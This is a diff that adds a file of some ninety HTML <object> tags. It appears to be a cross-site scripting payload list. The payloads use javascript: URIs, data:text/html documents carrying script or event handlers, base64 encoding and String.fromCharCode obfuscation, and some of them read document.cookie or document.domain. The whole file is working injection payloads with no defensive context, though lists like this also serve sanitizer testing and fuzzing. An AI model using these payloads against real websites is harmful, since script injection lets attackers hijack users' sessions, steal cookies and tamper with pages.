@@ -1,0 +1,89 @@
+<object data="javascript:alert(1)"></object>
+<object data="data:text/html,<script>alert(2)</script>"></object>
+<object data="about:blank" onerror="alert(3)"></object>
+<object type="text/html" data="javascript:alert(4)"></object>
+<object type="application/x-shockwave-flash" data="javascript:alert(5)"></object>
+<object data="javascript:alert(document.domain)"></object>
+<object data="javascript:alert(document.cookie)"></object>
+<object data="javascript:alert(document.URL)"></object>
+<object data="javascript:alert(navigator.userAgent)"></object>
+<object data="javascript:alert(window.location)"></object>
+<object data="data:text/html;base64,PHNjcmlwdD5hbGVydCgxNik8L3NjcmlwdD4="></object>
+<object data="data:text/html;charset=utf-8,<script>alert(17)</script>"></object>
+<object data="javascript:confirm(18)"></object>
+<object data="javascript:prompt(19)"></object>
+<object data="data:text/html,<body onload=alert(20)>"></object>
+<object data="data:text/html,<img src=x onerror=alert(21)>"></object>
+<object data="data:text/html,<svg/onload=alert(22)>"></object>
+<object data="data:text/html,<iframe src=javascript:alert(23)>"></object>
+<object data="data:text/html,<body onresize=alert(24)>"></object>
+<object data="data:text/html,<input autofocus onfocus=alert(25)>"></object>
+<object data="data:text/html,<script>setTimeout(alert,1000,26)</script>"></object>
+<object data="data:text/html,<style>@keyframes x{}</style><body onanimationstart=alert(27)>"></object>
+<object data="javascript:alert('XSS28')"></object>
+<object data="javascript:alert('XSS29')" type="text/html"></object>
+<object data="javascript:alert('XSS30')" type="application/xhtml+xml"></object>
+<object data="javascript:alert('XSS31')" type="image/svg+xml"></object>
+<object data="data:text/html,<body onunload=alert(32)>"></object>
+<object data="data:text/html,<object data='javascript:alert(33)'></object>"></object>
+<object data="data:text/html,<script src='data:text/javascript,alert(34)'></script>"></object>
+<object data="javascript:alert(String.fromCharCode(88,83,83))"></object>
+<object data="data:text/html,<body onload=confirm(35)>"></object>
+<object data="data:text/html,<body onload=prompt(36)>"></object>
+<object data="data:text/html,<svg><script>alert(37)</script></svg>"></object>
+<object data="javascript:alert(38)" width="0" height="0"></object>
+<object data="javascript:alert(39)" style="display:none"></object>
+<object data="javascript:alert(40)" tabindex="0"></object>
+<object data="javascript:alert(41)" onfocus="alert(42)"></object>
+<object data="javascript:alert(43)" onmouseenter="alert(44)"></object>
+<object data="javascript:alert(45)" onmouseleave="alert(46)"></object>
+<object data="javascript:alert(47)" onmouseover="alert(48)"></object>
+<object data="javascript:alert(49)" onmouseout="alert(50)"></object>
+<object data="data:text/html,<img src=x onerror=alert(51)>"></object>
+<object data="data:text/html,<iframe src='javascript:alert(52)'></iframe>"></object>
+<object data="data:text/html,<embed src='javascript:alert(53)'>"></object>
+<object data="data:text/html,<body onscroll=alert(54)>"></object>
+<object data="data:text/html,<video src=x onerror=alert(55)>"></object>
+<object data="data:text/html,<audio src=x onerror=alert(56)>"></object>
+<object data="data:text/html,<form onsubmit=alert(57)><input type=submit></form>"></object>
+<object data="javascript:alert(58)" name="xss"></object>
+<object data="javascript:alert(59)" id="xss"></object>
+<object data="javascript:alert(60)" class="xss"></object>
+<object data="javascript:alert(61)" style="visibility:hidden"></object>
+<object data="javascript:alert(62)" onload="alert(63)"></object>
+<object data="javascript:alert(64)" onerror="alert(65)"></object>
+<object data="data:text/html,<body onfocus=alert(66)>"></object>
+<object data="data:text/html,<body onblur=alert(67)>"></object>
+<object data="data:text/html,<svg onload=alert(68)>"></object>
+<object data="data:text/html,<svg><animate onbegin=alert(69)></animate></svg>"></object>
+<object data="data:text/html,<style>@keyframes x{}</style><body onanimationiteration=alert(70)>"></object>
+<object data="data:text/html,<marquee onstart=alert(71)>"></object>
+<object data="data:text/html,<details ontoggle=alert(72)>"></object>
+<object data="data:text/html,<summary onclick=alert(73)>"></object>
+<object data="javascript:alert(74)" tabindex="-1"></object>
+<object data="javascript:alert(75)" draggable="true"></object>
+<object data="javascript:alert(76)" contenteditable="true"></object>
+<object data="javascript:alert(77)" spellcheck="false"></object>
+<object data="javascript:alert(78)" role="alert"></object>
+<object data="javascript:alert(79)" aria-hidden="false"></object>
+<object data="javascript:alert(80)" hidden></object>
+<object data="javascript:alert(81)" draggable="false"></object>
+<object data="javascript:alert(82)" data-xss="true"></object>
+<object data="javascript:alert(83)" accesskey="x"></object>
+<object data="javascript:alert(84)" lang="en"></object>
+<object data="javascript:alert(85)" dir="ltr"></object>
+<object data="javascript:alert(86)" tabindex="1"></object>
+<object data="javascript:alert(87)" translate="yes"></object>
+<object data="javascript:alert(88)" spellcheck="true"></object>
+<object data="javascript:alert(89)" autocapitalize="off"></object>
+<object data="javascript:alert(90)" autocorrect="off"></object>
+<object data="javascript:alert(91)" role="button"></object>
+<object data="javascript:alert(92)" aria-pressed="true"></object>
+<object data="javascript:alert(93)" aria-label="XSS"></object>
+<object data="javascript:alert(94)" aria-live="polite"></object>
+<object data="javascript:alert(95)" aria-atomic="true"></object>
+<object data="javascript:alert(96)" aria-relevant="additions"></object>
+<object data="javascript:alert(97)" aria-disabled="false"></object>
+<object data="javascript:alert(98)" aria-expanded="true"></object>
+<object data="javascript:alert(99)" aria-haspopup="true"></object>
+<object data="javascript:alert(100)" aria-hidden="true"></object>
